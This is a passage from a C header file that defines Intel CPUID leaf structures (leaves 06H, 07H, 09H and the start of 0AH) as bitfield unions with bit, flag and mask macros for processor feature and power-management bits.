#define CPUID_EAX_PACKAGE_THERMAL_MANAGEMENT(_)                      (((_) >> 6) & 0x01)

            /**
             * [Bit 7] HWP. HWP base registers (IA32_PM_ENABLE[bit 0], IA32_HWP_CAPABILITIES, IA32_HWP_REQUEST, IA32_HWP_STATUS) are
             * supported if set.
             */
            UINT32 HwpBaseRegisters : 1;
#define CPUID_EAX_HWP_BASE_REGISTERS_BIT                             7
#define CPUID_EAX_HWP_BASE_REGISTERS_FLAG                            0x80
#define CPUID_EAX_HWP_BASE_REGISTERS_MASK                            0x01
#define CPUID_EAX_HWP_BASE_REGISTERS(_)                              (((_) >> 7) & 0x01)

            /**
             * [Bit 8] HWP_Notification. IA32_HWP_INTERRUPT MSR is supported if set.
             */
            UINT32 HwpNotification : 1;
#define CPUID_EAX_HWP_NOTIFICATION_BIT                               8
#define CPUID_EAX_HWP_NOTIFICATION_FLAG                              0x100
#define CPUID_EAX_HWP_NOTIFICATION_MASK                              0x01
#define CPUID_EAX_HWP_NOTIFICATION(_)                                (((_) >> 8) & 0x01)

            /**
             * [Bit 9] HWP_Activity_Window. IA32_HWP_REQUEST[bits 41:32] is supported if set.
             */
            UINT32 HwpActivityWindow : 1;
#define CPUID_EAX_HWP_ACTIVITY_WINDOW_BIT                            9
#define CPUID_EAX_HWP_ACTIVITY_WINDOW_FLAG                           0x200
#define CPUID_EAX_HWP_ACTIVITY_WINDOW_MASK                           0x01
#define CPUID_EAX_HWP_ACTIVITY_WINDOW(_)                             (((_) >> 9) & 0x01)

            /**
             * [Bit 10] HWP_Energy_Performance_Preference. IA32_HWP_REQUEST[bits 31:24] is supported if set.
             */
            UINT32 HwpEnergyPerformancePreference : 1;
#define CPUID_EAX_HWP_ENERGY_PERFORMANCE_PREFERENCE_BIT              10
#define CPUID_EAX_HWP_ENERGY_PERFORMANCE_PREFERENCE_FLAG             0x400
#define CPUID_EAX_HWP_ENERGY_PERFORMANCE_PREFERENCE_MASK             0x01
#define CPUID_EAX_HWP_ENERGY_PERFORMANCE_PREFERENCE(_)               (((_) >> 10) & 0x01)

            /**
             * [Bit 11] HWP_Package_Level_Request. IA32_HWP_REQUEST_PKG MSR is supported if set.
             */
            UINT32 HwpPackageLevelRequest : 1;
#define CPUID_EAX_HWP_PACKAGE_LEVEL_REQUEST_BIT                      11
#define CPUID_EAX_HWP_PACKAGE_LEVEL_REQUEST_FLAG                     0x800
#define CPUID_EAX_HWP_PACKAGE_LEVEL_REQUEST_MASK                     0x01
#define CPUID_EAX_HWP_PACKAGE_LEVEL_REQUEST(_)                       (((_) >> 11) & 0x01)
            UINT32 Reserved2 : 1;

            /**
             * [Bit 13] HDC. HDC base registers IA32_PKG_HDC_CTL, IA32_PM_CTL1, IA32_THREAD_STALL MSRs are supported if set.
             */
            UINT32 Hdc : 1;
#define CPUID_EAX_HDC_BIT                                            13
#define CPUID_EAX_HDC_FLAG                                           0x2000
#define CPUID_EAX_HDC_MASK                                           0x01
#define CPUID_EAX_HDC(_)                                             (((_) >> 13) & 0x01)

            /**
             * [Bit 14] Intel(R) Turbo Boost Max Technology 3.0 available.
             */
            UINT32 IntelTurboBoostMaxTechnology3Available : 1;
#define CPUID_EAX_INTEL_TURBO_BOOST_MAX_TECHNOLOGY_3_AVAILABLE_BIT   14
#define CPUID_EAX_INTEL_TURBO_BOOST_MAX_TECHNOLOGY_3_AVAILABLE_FLAG  0x4000
#define CPUID_EAX_INTEL_TURBO_BOOST_MAX_TECHNOLOGY_3_AVAILABLE_MASK  0x01
#define CPUID_EAX_INTEL_TURBO_BOOST_MAX_TECHNOLOGY_3_AVAILABLE(_)    (((_) >> 14) & 0x01)

            /**
             * [Bit 15] HWP Capabilities. Highest Performance change is supported if set.
             */
            UINT32 HwpCapabilities : 1;
#define CPUID_EAX_HWP_CAPABILITIES_BIT                               15
#define CPUID_EAX_HWP_CAPABILITIES_FLAG                              0x8000
#define CPUID_EAX_HWP_CAPABILITIES_MASK                              0x01
#define CPUID_EAX_HWP_CAPABILITIES(_)                                (((_) >> 15) & 0x01)

            /**
             * [Bit 16] HWP PECI override is supported if set.
             */
            UINT32 HwpPeciOverride : 1;
#define CPUID_EAX_HWP_PECI_OVERRIDE_BIT                              16
#define CPUID_EAX_HWP_PECI_OVERRIDE_FLAG                             0x10000
#define CPUID_EAX_HWP_PECI_OVERRIDE_MASK                             0x01
#define CPUID_EAX_HWP_PECI_OVERRIDE(_)                               (((_) >> 16) & 0x01)

            /**
             * [Bit 17] Flexible HWP is supported if set.
             */
            UINT32 FlexibleHwp : 1;
#define CPUID_EAX_FLEXIBLE_HWP_BIT                                   17
#define CPUID_EAX_FLEXIBLE_HWP_FLAG                                  0x20000
#define CPUID_EAX_FLEXIBLE_HWP_MASK                                  0x01
#define CPUID_EAX_FLEXIBLE_HWP(_)                                    (((_) >> 17) & 0x01)

            /**
             * [Bit 18] Fast access mode for the IA32_HWP_REQUEST MSR is supported if set.
             */
            UINT32 FastAccessModeForHwpRequestMsr : 1;
#define CPUID_EAX_FAST_ACCESS_MODE_FOR_HWP_REQUEST_MSR_BIT           18
#define CPUID_EAX_FAST_ACCESS_MODE_FOR_HWP_REQUEST_MSR_FLAG          0x40000
#define CPUID_EAX_FAST_ACCESS_MODE_FOR_HWP_REQUEST_MSR_MASK          0x01
#define CPUID_EAX_FAST_ACCESS_MODE_FOR_HWP_REQUEST_MSR(_)            (((_) >> 18) & 0x01)
            UINT32 Reserved3 : 1;

            /**
             * [Bit 20] Ignoring Idle Logical Processor HWP request is supported if set.
             */
            UINT32 IgnoringIdleLogicalProcessorHwpRequest : 1;
#define CPUID_EAX_IGNORING_IDLE_LOGICAL_PROCESSOR_HWP_REQUEST_BIT    20
#define CPUID_EAX_IGNORING_IDLE_LOGICAL_PROCESSOR_HWP_REQUEST_FLAG   0x100000
#define CPUID_EAX_IGNORING_IDLE_LOGICAL_PROCESSOR_HWP_REQUEST_MASK   0x01
#define CPUID_EAX_IGNORING_IDLE_LOGICAL_PROCESSOR_HWP_REQUEST(_)     (((_) >> 20) & 0x01)
            UINT32 Reserved4 : 11;
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 3:0] Number of Interrupt Thresholds in Digital Thermal Sensor.
             */
            UINT32 NumberOfInterruptThresholdsInThermalSensor : 4;
#define CPUID_EBX_NUMBER_OF_INTERRUPT_THRESHOLDS_IN_THERMAL_SENSOR_BIT 0
#define CPUID_EBX_NUMBER_OF_INTERRUPT_THRESHOLDS_IN_THERMAL_SENSOR_FLAG 0x0F
#define CPUID_EBX_NUMBER_OF_INTERRUPT_THRESHOLDS_IN_THERMAL_SENSOR_MASK 0x0F
#define CPUID_EBX_NUMBER_OF_INTERRUPT_THRESHOLDS_IN_THERMAL_SENSOR(_) (((_) >> 0) & 0x0F)
            UINT32 Reserved1 : 28;
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bit 0] Hardware Coordination Feedback Capability (Presence of IA32_MPERF and IA32_APERF). The capability to provide a
             * measure of delivered processor performance (since last reset of the counters), as a percentage of the expected processor
             * performance when running at the TSC frequency.
             */
            UINT32 HardwareCoordinationFeedbackCapability : 1;
#define CPUID_ECX_HARDWARE_COORDINATION_FEEDBACK_CAPABILITY_BIT      0
#define CPUID_ECX_HARDWARE_COORDINATION_FEEDBACK_CAPABILITY_FLAG     0x01
#define CPUID_ECX_HARDWARE_COORDINATION_FEEDBACK_CAPABILITY_MASK     0x01
#define CPUID_ECX_HARDWARE_COORDINATION_FEEDBACK_CAPABILITY(_)       (((_) >> 0) & 0x01)
            UINT32 Reserved1 : 2;

            /**
             * [Bit 3] The processor supports performance-energy bias preference if CPUID.06H:ECX.SETBH[bit 3] is set and it also
             * implies the presence of a new architectural MSR called IA32_ENERGY_PERF_BIAS (1B0H).
             */
            UINT32 PerformanceEnergyBiasPreference : 1;
#define CPUID_ECX_PERFORMANCE_ENERGY_BIAS_PREFERENCE_BIT             3
#define CPUID_ECX_PERFORMANCE_ENERGY_BIAS_PREFERENCE_FLAG            0x08
#define CPUID_ECX_PERFORMANCE_ENERGY_BIAS_PREFERENCE_MASK            0x01
#define CPUID_ECX_PERFORMANCE_ENERGY_BIAS_PREFERENCE(_)              (((_) >> 3) & 0x01)
            UINT32 Reserved2 : 28;
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EDX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT                                       0
#define CPUID_EDX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_06;


/**
 * @brief Structured Extended Feature Flags Enumeration Leaf (Output depends on ECX input value)
 *
 * When CPUID executes with EAX set to 07H and ECX = 0, the processor returns information about the maximum input value for
 * sub-leaves that contain extended feature flags.
 * When CPUID executes with EAX set to 07H and the input value of ECX is invalid (see leaf 07H entry in Table 3-8), the
 * processor returns 0 in EAX/EBX/ECX/EDX. In subleaf 0, EAX returns the maximum input value of the highest leaf 7
 * sub-leaf, and EBX, ECX & EDX contain information of extended feature flags.
 */
#define CPUID_STRUCTURED_EXTENDED_FEATURE_FLAGS                      0x00000007
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] Reports the maximum input value for supported leaf 7 sub-leaves.
             */
            UINT32 NumberOfSubLeaves : 32;
#define CPUID_EAX_NUMBER_OF_SUB_LEAVES_BIT                           0
#define CPUID_EAX_NUMBER_OF_SUB_LEAVES_FLAG                          0xFFFFFFFF
#define CPUID_EAX_NUMBER_OF_SUB_LEAVES_MASK                          0xFFFFFFFF
#define CPUID_EAX_NUMBER_OF_SUB_LEAVES(_)                            (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bit 0] Supports RDFSBASE/RDGSBASE/WRFSBASE/WRGSBASE if 1.
             */
            UINT32 Fsgsbase : 1;
#define CPUID_EBX_FSGSBASE_BIT                                       0
#define CPUID_EBX_FSGSBASE_FLAG                                      0x01
#define CPUID_EBX_FSGSBASE_MASK                                      0x01
#define CPUID_EBX_FSGSBASE(_)                                        (((_) >> 0) & 0x01)

            /**
             * [Bit 1] IA32_TSC_ADJUST MSR is supported if 1.
             */
            UINT32 Ia32TscAdjustMsr : 1;
#define CPUID_EBX_IA32_TSC_ADJUST_MSR_BIT                            1
#define CPUID_EBX_IA32_TSC_ADJUST_MSR_FLAG                           0x02
#define CPUID_EBX_IA32_TSC_ADJUST_MSR_MASK                           0x01
#define CPUID_EBX_IA32_TSC_ADJUST_MSR(_)                             (((_) >> 1) & 0x01)

            /**
             * [Bit 2] Supports Intel(R) Software Guard Extensions (Intel(R) SGX Extensions) if 1.
             */
            UINT32 Sgx : 1;
#define CPUID_EBX_SGX_BIT                                            2
#define CPUID_EBX_SGX_FLAG                                           0x04
#define CPUID_EBX_SGX_MASK                                           0x01
#define CPUID_EBX_SGX(_)                                             (((_) >> 2) & 0x01)

            /**
             * [Bit 3] BMI1.
             */
            UINT32 Bmi1 : 1;
#define CPUID_EBX_BMI1_BIT                                           3
#define CPUID_EBX_BMI1_FLAG                                          0x08
#define CPUID_EBX_BMI1_MASK                                          0x01
#define CPUID_EBX_BMI1(_)                                            (((_) >> 3) & 0x01)

            /**
             * [Bit 4] HLE.
             */
            UINT32 Hle : 1;
#define CPUID_EBX_HLE_BIT                                            4
#define CPUID_EBX_HLE_FLAG                                           0x10
#define CPUID_EBX_HLE_MASK                                           0x01
#define CPUID_EBX_HLE(_)                                             (((_) >> 4) & 0x01)

            /**
             * [Bit 5] AVX2.
             */
            UINT32 Avx2 : 1;
#define CPUID_EBX_AVX2_BIT                                           5
#define CPUID_EBX_AVX2_FLAG                                          0x20
#define CPUID_EBX_AVX2_MASK                                          0x01
#define CPUID_EBX_AVX2(_)                                            (((_) >> 5) & 0x01)

            /**
             * [Bit 6] x87 FPU Data Pointer updated only on x87 exceptions if 1.
             */
            UINT32 FdpExcptnOnly : 1;
#define CPUID_EBX_FDP_EXCPTN_ONLY_BIT                                6
#define CPUID_EBX_FDP_EXCPTN_ONLY_FLAG                               0x40
#define CPUID_EBX_FDP_EXCPTN_ONLY_MASK                               0x01
#define CPUID_EBX_FDP_EXCPTN_ONLY(_)                                 (((_) >> 6) & 0x01)

            /**
             * [Bit 7] Supports Supervisor-Mode Execution Prevention if 1.
             */
            UINT32 Smep : 1;
#define CPUID_EBX_SMEP_BIT                                           7
#define CPUID_EBX_SMEP_FLAG                                          0x80
#define CPUID_EBX_SMEP_MASK                                          0x01
#define CPUID_EBX_SMEP(_)                                            (((_) >> 7) & 0x01)

            /**
             * [Bit 8] BMI2.
             */
            UINT32 Bmi2 : 1;
#define CPUID_EBX_BMI2_BIT                                           8
#define CPUID_EBX_BMI2_FLAG                                          0x100
#define CPUID_EBX_BMI2_MASK                                          0x01
#define CPUID_EBX_BMI2(_)                                            (((_) >> 8) & 0x01)

            /**
             * [Bit 9] Supports Enhanced REP MOVSB/STOSB if 1.
             */
            UINT32 EnhancedRepMovsbStosb : 1;
#define CPUID_EBX_ENHANCED_REP_MOVSB_STOSB_BIT                       9
#define CPUID_EBX_ENHANCED_REP_MOVSB_STOSB_FLAG                      0x200
#define CPUID_EBX_ENHANCED_REP_MOVSB_STOSB_MASK                      0x01
#define CPUID_EBX_ENHANCED_REP_MOVSB_STOSB(_)                        (((_) >> 9) & 0x01)

            /**
             * [Bit 10] If 1, supports INVPCID instruction for system software that manages process-context identifiers.
             */
            UINT32 Invpcid : 1;
#define CPUID_EBX_INVPCID_BIT                                        10
#define CPUID_EBX_INVPCID_FLAG                                       0x400
#define CPUID_EBX_INVPCID_MASK                                       0x01
#define CPUID_EBX_INVPCID(_)                                         (((_) >> 10) & 0x01)

            /**
             * [Bit 11] RTM.
             */
            UINT32 Rtm : 1;
#define CPUID_EBX_RTM_BIT                                            11
#define CPUID_EBX_RTM_FLAG                                           0x800
#define CPUID_EBX_RTM_MASK                                           0x01
#define CPUID_EBX_RTM(_)                                             (((_) >> 11) & 0x01)

            /**
             * [Bit 12] Supports Intel(R) Resource Director Technology (Intel(R) RDT) Monitoring capability if 1.
             */
            UINT32 RdtM : 1;
#define CPUID_EBX_RDT_M_BIT                                          12
#define CPUID_EBX_RDT_M_FLAG                                         0x1000
#define CPUID_EBX_RDT_M_MASK                                         0x01
#define CPUID_EBX_RDT_M(_)                                           (((_) >> 12) & 0x01)

            /**
             * [Bit 13] Deprecates FPU CS and FPU DS values if 1.
             */
            UINT32 Deprecates : 1;
#define CPUID_EBX_DEPRECATES_BIT                                     13
#define CPUID_EBX_DEPRECATES_FLAG                                    0x2000
#define CPUID_EBX_DEPRECATES_MASK                                    0x01
#define CPUID_EBX_DEPRECATES(_)                                      (((_) >> 13) & 0x01)

            /**
             * [Bit 14] Supports Intel(R) Memory Protection Extensions if 1.
             */
            UINT32 Mpx : 1;
#define CPUID_EBX_MPX_BIT                                            14
#define CPUID_EBX_MPX_FLAG                                           0x4000
#define CPUID_EBX_MPX_MASK                                           0x01
#define CPUID_EBX_MPX(_)                                             (((_) >> 14) & 0x01)

            /**
             * [Bit 15] Supports Intel(R) Resource Director Technology (Intel(R) RDT) Allocation capability if 1.
             */
            UINT32 Rdt : 1;
#define CPUID_EBX_RDT_BIT                                            15
#define CPUID_EBX_RDT_FLAG                                           0x8000
#define CPUID_EBX_RDT_MASK                                           0x01
#define CPUID_EBX_RDT(_)                                             (((_) >> 15) & 0x01)

            /**
             * [Bit 16] AVX512F.
             */
            UINT32 Avx512F : 1;
#define CPUID_EBX_AVX512F_BIT                                        16
#define CPUID_EBX_AVX512F_FLAG                                       0x10000
#define CPUID_EBX_AVX512F_MASK                                       0x01
#define CPUID_EBX_AVX512F(_)                                         (((_) >> 16) & 0x01)

            /**
             * [Bit 17] AVX512DQ.
             */
            UINT32 Avx512Dq : 1;
#define CPUID_EBX_AVX512DQ_BIT                                       17
#define CPUID_EBX_AVX512DQ_FLAG                                      0x20000
#define CPUID_EBX_AVX512DQ_MASK                                      0x01
#define CPUID_EBX_AVX512DQ(_)                                        (((_) >> 17) & 0x01)

            /**
             * [Bit 18] RDSEED.
             */
            UINT32 Rdseed : 1;
#define CPUID_EBX_RDSEED_BIT                                         18
#define CPUID_EBX_RDSEED_FLAG                                        0x40000
#define CPUID_EBX_RDSEED_MASK                                        0x01
#define CPUID_EBX_RDSEED(_)                                          (((_) >> 18) & 0x01)

            /**
             * [Bit 19] ADX.
             */
            UINT32 Adx : 1;
#define CPUID_EBX_ADX_BIT                                            19
#define CPUID_EBX_ADX_FLAG                                           0x80000
#define CPUID_EBX_ADX_MASK                                           0x01
#define CPUID_EBX_ADX(_)                                             (((_) >> 19) & 0x01)

            /**
             * [Bit 20] Supports Supervisor-Mode Access Prevention (and the CLAC/STAC instructions) if 1.
             */
            UINT32 Smap : 1;
#define CPUID_EBX_SMAP_BIT                                           20
#define CPUID_EBX_SMAP_FLAG                                          0x100000
#define CPUID_EBX_SMAP_MASK                                          0x01
#define CPUID_EBX_SMAP(_)                                            (((_) >> 20) & 0x01)

            /**
             * [Bit 21] AVX512_IFMA.
             */
            UINT32 Avx512Ifma : 1;
#define CPUID_EBX_AVX512_IFMA_BIT                                    21
#define CPUID_EBX_AVX512_IFMA_FLAG                                   0x200000
#define CPUID_EBX_AVX512_IFMA_MASK                                   0x01
#define CPUID_EBX_AVX512_IFMA(_)                                     (((_) >> 21) & 0x01)
            UINT32 Reserved1 : 1;

            /**
             * [Bit 23] CLFLUSHOPT.
             */
            UINT32 Clflushopt : 1;
#define CPUID_EBX_CLFLUSHOPT_BIT                                     23
#define CPUID_EBX_CLFLUSHOPT_FLAG                                    0x800000
#define CPUID_EBX_CLFLUSHOPT_MASK                                    0x01
#define CPUID_EBX_CLFLUSHOPT(_)                                      (((_) >> 23) & 0x01)

            /**
             * [Bit 24] CLWB.
             */
            UINT32 Clwb : 1;
#define CPUID_EBX_CLWB_BIT                                           24
#define CPUID_EBX_CLWB_FLAG                                          0x1000000
#define CPUID_EBX_CLWB_MASK                                          0x01
#define CPUID_EBX_CLWB(_)                                            (((_) >> 24) & 0x01)

            /**
             * [Bit 25] Intel Processor Trace.
             */
            UINT32 Intel : 1;
#define CPUID_EBX_INTEL_BIT                                          25
#define CPUID_EBX_INTEL_FLAG                                         0x2000000
#define CPUID_EBX_INTEL_MASK                                         0x01
#define CPUID_EBX_INTEL(_)                                           (((_) >> 25) & 0x01)

            /**
             * [Bit 26] (Intel(R) Xeon Phi(TM) only).
             */
            UINT32 Avx512Pf : 1;
#define CPUID_EBX_AVX512PF_BIT                                       26
#define CPUID_EBX_AVX512PF_FLAG                                      0x4000000
#define CPUID_EBX_AVX512PF_MASK                                      0x01
#define CPUID_EBX_AVX512PF(_)                                        (((_) >> 26) & 0x01)

            /**
             * [Bit 27] (Intel(R) Xeon Phi(TM) only).
             */
            UINT32 Avx512Er : 1;
#define CPUID_EBX_AVX512ER_BIT                                       27
#define CPUID_EBX_AVX512ER_FLAG                                      0x8000000
#define CPUID_EBX_AVX512ER_MASK                                      0x01
#define CPUID_EBX_AVX512ER(_)                                        (((_) >> 27) & 0x01)

            /**
             * [Bit 28] AVX512CD.
             */
            UINT32 Avx512Cd : 1;
#define CPUID_EBX_AVX512CD_BIT                                       28
#define CPUID_EBX_AVX512CD_FLAG                                      0x10000000
#define CPUID_EBX_AVX512CD_MASK                                      0x01
#define CPUID_EBX_AVX512CD(_)                                        (((_) >> 28) & 0x01)

            /**
             * [Bit 29] Supports Intel(R) Secure Hash Algorithm Extensions (Intel(R) SHA Extensions) if 1.
             */
            UINT32 Sha : 1;
#define CPUID_EBX_SHA_BIT                                            29
#define CPUID_EBX_SHA_FLAG                                           0x20000000
#define CPUID_EBX_SHA_MASK                                           0x01
#define CPUID_EBX_SHA(_)                                             (((_) >> 29) & 0x01)

            /**
             * [Bit 30] AVX512BW.
             */
            UINT32 Avx512Bw : 1;
#define CPUID_EBX_AVX512BW_BIT                                       30
#define CPUID_EBX_AVX512BW_FLAG                                      0x40000000
#define CPUID_EBX_AVX512BW_MASK                                      0x01
#define CPUID_EBX_AVX512BW(_)                                        (((_) >> 30) & 0x01)

            /**
             * [Bit 31] AVX512VL.
             */
            UINT32 Avx512Vl : 1;
#define CPUID_EBX_AVX512VL_BIT                                       31
#define CPUID_EBX_AVX512VL_FLAG                                      0x80000000
#define CPUID_EBX_AVX512VL_MASK                                      0x01
#define CPUID_EBX_AVX512VL(_)                                        (((_) >> 31) & 0x01)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bit 0] (Intel(R) Xeon Phi(TM) only).
             */
            UINT32 Prefetchwt1 : 1;
#define CPUID_ECX_PREFETCHWT1_BIT                                    0
#define CPUID_ECX_PREFETCHWT1_FLAG                                   0x01
#define CPUID_ECX_PREFETCHWT1_MASK                                   0x01
#define CPUID_ECX_PREFETCHWT1(_)                                     (((_) >> 0) & 0x01)

            /**
             * [Bit 1] AVX512_VBMI.
             */
            UINT32 Avx512Vbmi : 1;
#define CPUID_ECX_AVX512_VBMI_BIT                                    1
#define CPUID_ECX_AVX512_VBMI_FLAG                                   0x02
#define CPUID_ECX_AVX512_VBMI_MASK                                   0x01
#define CPUID_ECX_AVX512_VBMI(_)                                     (((_) >> 1) & 0x01)

            /**
             * [Bit 2] Supports user-mode instruction prevention if 1.
             */
            UINT32 Umip : 1;
#define CPUID_ECX_UMIP_BIT                                           2
#define CPUID_ECX_UMIP_FLAG                                          0x04
#define CPUID_ECX_UMIP_MASK                                          0x01
#define CPUID_ECX_UMIP(_)                                            (((_) >> 2) & 0x01)

            /**
             * [Bit 3] Supports protection keys for user-mode pages if 1.
             */
            UINT32 Pku : 1;
#define CPUID_ECX_PKU_BIT                                            3
#define CPUID_ECX_PKU_FLAG                                           0x08
#define CPUID_ECX_PKU_MASK                                           0x01
#define CPUID_ECX_PKU(_)                                             (((_) >> 3) & 0x01)

            /**
             * [Bit 4] If 1, OS has set CR4.PKE to enable protection keys (and the RDPKRU/WRPKRU instructions).
             */
            UINT32 Ospke : 1;
#define CPUID_ECX_OSPKE_BIT                                          4
#define CPUID_ECX_OSPKE_FLAG                                         0x10
#define CPUID_ECX_OSPKE_MASK                                         0x01
#define CPUID_ECX_OSPKE(_)                                           (((_) >> 4) & 0x01)
            UINT32 Reserved1 : 12;

            /**
             * [Bits 21:17] The value of MAWAU used by the BNDLDX and BNDSTX instructions in 64-bit mode.
             */
            UINT32 Mawau : 5;
#define CPUID_ECX_MAWAU_BIT                                          17
#define CPUID_ECX_MAWAU_FLAG                                         0x3E0000
#define CPUID_ECX_MAWAU_MASK                                         0x1F
#define CPUID_ECX_MAWAU(_)                                           (((_) >> 17) & 0x1F)

            /**
             * [Bit 22] RDPID and IA32_TSC_AUX are available if 1.
             */
            UINT32 Rdpid : 1;
#define CPUID_ECX_RDPID_BIT                                          22
#define CPUID_ECX_RDPID_FLAG                                         0x400000
#define CPUID_ECX_RDPID_MASK                                         0x01
#define CPUID_ECX_RDPID(_)                                           (((_) >> 22) & 0x01)
            UINT32 Reserved2 : 7;

            /**
             * [Bit 30] Supports SGX Launch Configuration if 1.
             */
            UINT32 SgxLc : 1;
#define CPUID_ECX_SGX_LC_BIT                                         30
#define CPUID_ECX_SGX_LC_FLAG                                        0x40000000
#define CPUID_ECX_SGX_LC_MASK                                        0x01
#define CPUID_ECX_SGX_LC(_)                                          (((_) >> 30) & 0x01)
            UINT32 Reserved3 : 1;
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EDX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT                                       0
#define CPUID_EDX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_07;


/**
 * @brief Direct Cache Access Information Leaf
 *
 * When CPUID executes with EAX set to 09H, the processor returns information about Direct Cache Access capabilities.
 */
#define CPUID_DIRECT_CACHE_ACCESS_INFORMATION                        0x00000009
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] Value of bits [31:0] of IA32_PLATFORM_DCA_CAP MSR (address 1F8H).
             */
            UINT32 Ia32PlatformDcaCap : 32;
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_BIT                          0
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_FLAG                         0xFFFFFFFF
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_MASK                         0xFFFFFFFF
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP(_)                           (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EBX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT                                       0
#define CPUID_EBX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] ECX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT                                       0
#define CPUID_ECX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EDX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT                                       0
#define CPUID_EDX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_09;


/**
 * @brief Architectural Performance Monitoring Leaf
 *
 * When CPUID executes with EAX set to 0AH, the processor returns information about support for architectural performance
 * monitoring capabilities. Architectural performance monitoring is supported if the version ID is greater than Pn 0. For
 * each version of architectural performance monitoring capability, software must enumerate this leaf to discover the
 * programming facilities and the architectural performance events available in the processor.
 *
 * @see Vol3C[23(Introduction to Virtual-Machine Extensions)]
 */
#define CPUID_ARCHITECTURAL_PERFORMANCE_MONITORING                   0x0000000A
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 7:0] Version ID of architectural performance monitoring.
             */
            UINT32 VersionIdOfArchitecturalPerformanceMonitoring : 8;
#define CPUID_EAX_VERSION_ID_OF_ARCHITECTURAL_PERFORMANCE_MONITORING_BIT 0
#define CPUID_EAX_VERSION_ID_OF_ARCHITECTURAL_PERFORMANCE_MONITORING_FLAG 0xFF
#define CPUID_EAX_VERSION_ID_OF_ARCHITECTURAL_PERFORMANCE_MONITORING_MASK 0xFF
#define CPUID_EAX_VERSION_ID_OF_ARCHITECTURAL_PERFORMANCE_MONITORING(_) (((_) >> 0) & 0xFF)

            /**
             * [Bits 15:8] Number of general-purpose performance monitoring counter per logical processor.
             */
            UINT32 NumberOfPerformanceMonitoringCounterPerLogicalProcessor : 8;
#define CPUID_EAX_NUMBER_OF_PERFORMANCE_MONITORING_COUNTER_PER_LOGICAL_PROCESSOR_BIT 8
#define CPUID_EAX_NUMBER_OF_PERFORMANCE_MONITORING_COUNTER_PER_LOGICAL_PROCESSOR_FLAG 0xFF00
#define CPUID_EAX_NUMBER_OF_PERFORMANCE_MONITORING_COUNTER_PER_LOGICAL_PROCESSOR_MASK 0xFF
#define CPUID_EAX_NUMBER_OF_PERFORMANCE_MONITORING_COUNTER_PER_LOGICAL_PROCESSOR(_) (((_) >> 8) & 0xFF)

            /**
             * [Bits 23:16] Bit width of general-purpose, performance monitoring counter.
             */
            UINT32 BitWidthOfPerformanceMonitoringCounter : 8;
#define CPUID_EAX_BIT_WIDTH_OF_PERFORMANCE_MONITORING_COUNTER_BIT    16
#define CPUID_EAX_BIT_WIDTH_OF_PERFORMANCE_MONITORING_COUNTER_FLAG   0xFF0000
#define CPUID_EAX_BIT_WIDTH_OF_PERFORMANCE_MONITORING_COUNTER_MASK   0xFF
#define CPUID_EAX_BIT_WIDTH_OF_PERFORMANCE_MONITORING_COUNTER(_)     (((_) >> 16) & 0xFF)

            /**
             * [Bits 31:24] Length of EBX bit vector to enumerate architectural performance monitoring events.
             */
            UINT32 EbxBitVectorLength : 8;
#define CPUID_EAX_EBX_BIT_VECTOR_LENGTH_BIT                          24
#define CPUID_EAX_EBX_BIT_VECTOR_LENGTH_FLAG                         0xFF000000
#define CPUID_EAX_EBX_BIT_VECTOR_LENGTH_MASK                         0xFF
#define CPUID_EAX_EBX_BIT_VECTOR_LENGTH(_)                           (((_) >> 24) & 0xFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bit 0] Core cycle event not available if 1.
             */
            UINT32 CoreCycleEventNotAvailable : 1;
#define CPUID_EBX_CORE_CYCLE_EVENT_NOT_AVAILABLE_BIT                 0
#define CPUID_EBX_CORE_CYCLE_EVENT_NOT_AVAILABLE_FLAG                0x01
#define CPUID_EBX_CORE_CYCLE_EVENT_NOT_AVAILABLE_MASK                0x01
